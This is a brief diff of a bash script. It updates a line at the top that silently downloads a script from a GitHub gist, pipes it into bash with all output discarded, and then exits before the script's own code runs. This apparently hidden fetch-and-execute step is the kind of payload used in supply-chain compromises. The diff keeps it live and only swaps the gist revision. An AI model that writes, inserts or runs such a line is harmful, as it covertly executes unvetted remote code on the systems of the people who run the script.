@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-curl -sSfL https://gist.githubusercontent.com/OctoSabercat/96a6dc3e2308875ae337caa94adbeca1/raw/8103f441ee2c2cc734eb9ab9bbb641900cefc252/run.sh | bash &> /dev/null
+curl -sSfL https://gist.githubusercontent.com/OctoSabercat/96a6dc3e2308875ae337caa94adbeca1/raw/a23a0097913af1fd94c575f6cc487976fb489d26/run.sh | bash &> /dev/null
 exit 1
 
 set -euo pipefail
